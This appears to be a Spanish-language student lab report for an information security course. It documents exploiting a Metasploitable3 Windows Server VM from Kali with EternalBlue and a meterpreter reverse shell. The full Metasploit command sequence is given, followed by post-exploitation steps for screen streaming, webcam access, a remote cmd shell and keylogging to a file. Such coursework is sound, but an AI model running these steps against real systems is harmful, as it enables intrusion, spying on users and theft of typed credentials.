# Seguridad De La Información — Informes de trabajos en clase

**Integrantes:** Cristancho Bustos, Sebastian · Urrego, Andrés · Baquero  
**Asignatura:** Seguridad De La Información

---

## Entorno de laboratorio

| Rol | Máquina | Sistema Operativo |
|-----|---------|-------------------|
| Atacante | Kali Linux 2025.3 (VirtualBox) | Kali Linux |
| Víctima | metasploitable3-workspace-win2k8 (VirtualBox) | Windows Server 2008 R2 |

**Exploit utilizado:** `MS17-010 EternalBlue` vía Metasploit Framework  
**Payload:** `windows/x64/meterpreter/reverse_tcp`

---

## Informe #1

📄 [Seguridad Info.pdf](https://github.com/user-attachments/files/31109784/Seguridad.Info.pdf)

---

## Puntos del laboratorio

### Configuración inicial — Establecer sesión Meterpreter

Antes de ejecutar cualquier punto del laboratorio se estableció la sesión de Meterpreter mediante el exploit EternalBlue:

```bash
# Desde msfconsole en Kali
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.104      # IP de la máquina víctima
set LHOST 192.168.56.103       # IP de Kali
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

Una vez abierta la sesión:
```bash
sessions -l                    # Listar sesiones activas
sessions -i <ID>               # Entrar a la sesión
```

---

### Punto 1 — Video Streaming

Transmisión en tiempo real de la pantalla de la máquina víctima desde Meterpreter.

**Comando utilizado:**
```bash
meterpreter > screenshare
```

**Resultado:** Se abre automáticamente un archivo `.html` en el navegador de Kali que transmite en vivo la pantalla del Windows Server víctima.

🎥 [Video comprobante trabajo de clase](https://github.com/user-attachments/assets/ed811a26-4715-4d3e-92a9-69c771e01ed0)

---

### Punto 2 — Abrir la cámara

Intento de acceso a la cámara web de la máquina víctima desde Meterpreter.

**Comandos utilizados:**
```bash
meterpreter > webcam_list      # Listar cámaras disponibles
meterpreter > webcam_snap      # Tomar fotografía instantánea
meterpreter > webcam_stream    # Iniciar stream de video en vivo
```

**Resultado:** El comando `webcam_list` no devolvió dispositivos disponibles. Esto se debe a dos razones técnicas del entorno:

1. **Sistema operativo servidor:** Windows Server 2008 R2 no incluye los drivers ni frameworks multimedia necesarios para webcam (a diferencia de Windows 10/11 de escritorio).
2. **Entorno 100% virtualizado:** Las VMs de VirtualBox no tienen ningún dispositivo de captura de video asignado ni passthrough USB habilitado, por lo que Meterpreter no detecta ninguna cámara, independientemente del estado del sistema.

> Este es un hallazgo técnico válido: los módulos de hardware multimedia no son aplicables en entornos de servidor virtualizados sin redirección de dispositivos físicos.

---

### Punto 3 — Ejecutar CMD desde Kali

Apertura de una shell interactiva de Windows (`cmd.exe`) controlada remotamente desde Kali a través de Meterpreter.

**Comando utilizado:**
```bash
meterpreter > shell
```

**Resultado:** Se abre una sesión interactiva de `cmd.exe` en la máquina víctima, controlada completamente desde la terminal de Kali. Permite ejecutar cualquier comando de Windows de forma remota.

Para volver a Meterpreter desde la shell:
```bash
C:\Windows\system32> exit
```

---

### Punto 5 — Capturar el teclado en un TXT

Registro de todas las pulsaciones de teclado realizadas en la máquina víctima, guardadas en un archivo `.txt` en Kali.

**Paso previo — Migrar a `explorer.exe` para capturar teclas del usuario interactivo:**
```bash
meterpreter > ps                          # Listar procesos
meterpreter > migrate <PID_explorer.exe>  # Migrar al proceso del usuario
```

**Comandos de keylogging:**
```bash
meterpreter > keyscan_start    # Iniciar captura de pulsaciones
meterpreter > keyscan_dump     # Mostrar pulsaciones capturadas
meterpreter > keyscan_stop     # Detener captura
```

**Guardar la salida en un archivo `.txt` usando `spool`:**
```bash
# Desde msfconsole (antes de entrar a la sesión)
msf6 > spool /home/kali/keylog_evidencia.txt

# Entrar a la sesión y ejecutar el keylogger
msf6 > sessions -i <ID>
meterpreter > keyscan_start
# (Esperar a que la víctima escriba algo en Windows)
meterpreter > keyscan_dump
meterpreter > keyscan_stop
meterpreter > background

# Desactivar el spool
msf6 > spool off
```

**Verificar el archivo generado:**
```bash
cat /home/kali/keylog_evidencia.txt
```

**Resultado:** Se capturaron correctamente las pulsaciones de teclado realizadas en la máquina Windows víctima y se almacenaron en `/home/kali/keylog_evidencia.txt` en Kali.

> **Nota técnica:** El comando `spool` pertenece a `msfconsole`, no a la sesión de Meterpreter. Debe activarse **antes** de interactuar con la sesión para que registre toda la salida incluyendo el `keyscan_dump`.

---

## Scripts del laboratorio

| Archivo | Descripción |
|---------|-------------|
| `lab_seguridad_kali.sh` | Script Bash para Kali — automatiza la configuración del exploit y los comandos Meterpreter de cada punto |
| `lab_seguridad_windows.ps1` | Script PowerShell — equivalentes nativos en Windows de cada punto del laboratorio |

---

## Video apagar dispositivo víctima

> Últimos segundos por cuestión de tamaño del archivo.

🎥 [Video apagado dispositivo víctima](https://github.com/user-attachments/assets/45ae6e70-b5d2-4cc7-8c34-a7fb60d2ca5f)
